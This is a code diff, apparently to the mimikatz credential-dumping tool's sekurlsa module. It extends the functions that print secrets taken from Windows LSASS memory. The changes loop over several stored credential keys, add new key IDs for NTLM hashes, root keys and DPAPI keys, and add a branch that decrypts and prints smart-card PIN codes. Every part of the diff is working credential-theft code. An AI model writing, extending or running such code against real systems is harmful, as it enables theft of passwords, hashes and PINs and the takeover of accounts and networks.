@@ -196,7 +196,7 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds;
 	PRPCE_CREDENTIAL_KEYCREDENTIAL pRpceCredentialKeyCreds;
 	PVOID base;
-	DWORD type;
+	DWORD type, i;
 
 	if(mesCreds)
 	{
@@ -224,14 +224,27 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					dprintf("\n\t * SHA1     : "); kull_m_string_dprintf_hex(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
 					break;
 				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
-					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) credentials->Buffer; /* .. */
-					base = (PBYTE) pRpceCredentialKeyCreds + sizeof(RPCE_CREDENTIAL_KEYCREDENTIAL);
-					kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key1, &base);
-					kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key2, &base);
+					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) credentials->Buffer;
+					base = (PBYTE) pRpceCredentialKeyCreds + sizeof(RPCE_CREDENTIAL_KEYCREDENTIAL) + (pRpceCredentialKeyCreds->unk0 - 1) * sizeof(MARSHALL_KEY);
+					for (i = 0; i < pRpceCredentialKeyCreds->unk0; i++)
+						kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key[i], &base);
 					break;
 				default:
 					dprintf("\n\t * Raw data : ");
 					kull_m_string_dprintf_hex(credentials->Buffer, credentials->Length, 1);
+				}
+			}
+		}
+		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE)
+		{
+			if(mesCreds->UserName.Buffer)
+			{
+				if(kull_m_string_getDbgUnicodeString(&mesCreds->UserName))
+				{
+					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
+						kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(mesCreds->UserName.Buffer, mesCreds->UserName.MaximumLength);
+					dprintf("\n\t * PIN code : %wZ", &mesCreds->UserName);
+					LocalFree(mesCreds->UserName.Buffer);
 				}
 			}
 		}
@@ -292,15 +305,18 @@ VOID kuhl_m_sekurlsa_genericKeyOutput(PMARSHALL_KEY key, PVOID * dirtyBase)
 	switch(key->unkId)
 	{
 	case 0x00010002:
+	case 0x00010003:
 		dprintf("\n\t * NTLM     : ");
 		break;
 	case 0x00020002:
 		dprintf("\n\t * SHA1     : ");
 		break;
 	case 0x00030002:
+	case 0x00030003:
 		dprintf("\n\t * RootKey  : ");
 		break;
 	case 0x00040002:
+	case 0x00040003:
 		dprintf("\n\t * DPAPI    : ");
 		break;
 	default:
